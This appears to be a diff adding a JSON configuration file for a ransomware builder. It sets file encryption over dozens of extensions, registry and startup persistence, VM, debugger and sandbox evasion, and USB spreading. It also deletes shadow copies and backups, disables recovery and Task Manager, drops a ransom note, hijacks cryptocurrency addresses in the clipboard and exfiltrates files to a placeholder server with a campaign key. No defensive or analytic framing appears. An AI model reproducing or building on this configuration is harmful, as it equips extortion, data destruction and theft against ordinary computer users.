@@ -1,0 +1,95 @@
+{
+  "encryption": {
+    "mode": "Hybrid",
+    "extension": "",
+    "targetExtensions": [
+      ".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx",
+      ".pdf", ".jpg", ".jpeg", ".png", ".bmp", ".gif",
+      ".mp3", ".mp4", ".avi", ".mkv", ".mov",
+      ".zip", ".rar", ".7z", ".tar", ".gz",
+      ".sql", ".db", ".sqlite", ".mdb",
+      ".cs", ".cpp", ".h", ".py", ".js", ".ts", ".java",
+      ".xml", ".json", ".yaml", ".yml", ".ini", ".cfg",
+      ".bak", ".backup", ".log"
+    ],
+    "publicKeyXml": ""
+  },
+  "persistence": {
+    "appData": true,
+    "processName": "",
+    "startupFolder": true,
+    "registryRun": true,
+    "requireAdmin": false,
+    "processInjection": false,
+    "injectionTarget": "explorer.exe"
+  },
+  "antiAnalysis": {
+    "sleepSeconds": 30,
+    "sleepJitterPercent": 30,
+    "vmChecks": true,
+    "debuggerChecks": true,
+    "timingChecks": true,
+    "sandboxArtifacts": true
+  },
+  "spreading": {
+    "usb": true,
+    "name": "",
+    "networkShares": false,
+    "lateralMovement": false
+  },
+  "adminActions": {
+    "deleteShadowCopies": true,
+    "disableRecoveryMode": true,
+    "deleteBackupCatalog": true,
+    "disableTaskManager": true
+  },
+  "ransomNote": {
+    "filename": "README.txt",
+    "lines": [
+      "Your files have been encrypted.",
+      "To restore them, contact us at: support@example.com",
+      "Your ID: {VICTIM_ID}"
+    ]
+  },
+  "wallpaper": {
+    "enabled": true,
+    "imagePath": "",
+    "base64": ""
+  },
+  "clipboardHijacker": {
+    "enabled": true,
+    "btcRegex": "(?:[13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})",
+    "ethRegex": "0x[a-fA-F0-9]{40}"
+  },
+  "exfiltration": {
+    "enabled": true,
+    "serverUrl": "https://YOUR_VERCEL_PROJECT.vercel.app",
+    "apiKey": "campaign-key-12345",
+    "maxFileSizeMB": 50,
+    "targetExtensions": [
+      ".txt", ".doc", ".docx", ".xls", ".xlsx", ".pdf",
+      ".sql", ".db", ".sqlite", ".json", ".xml",
+      ".cs", ".cpp", ".h", ".py", ".js", ".ts",
+      ".ini", ".cfg", ".config", ".bak"
+    ],
+    "skipExtensions": [
+      ".exe", ".dll", ".sys", ".msi", ".iso"
+    ],
+    "maxFiles": 1000,
+    "compress": true,
+    "encrypt": true,
+    "timeoutSeconds": 30,
+    "retryCount": 3,
+    "retryDelaySeconds": 5
+  },
+  "build": {
+    "targetFramework": "net8.0",
+    "publishAot": false,
+    "stripSymbols": true,
+    "optimize": true,
+    "outputPath": "./output",
+    "iconPath": "",
+    "stringEncryption": false,
+    "controlFlowObfuscation": false
+  }
+}
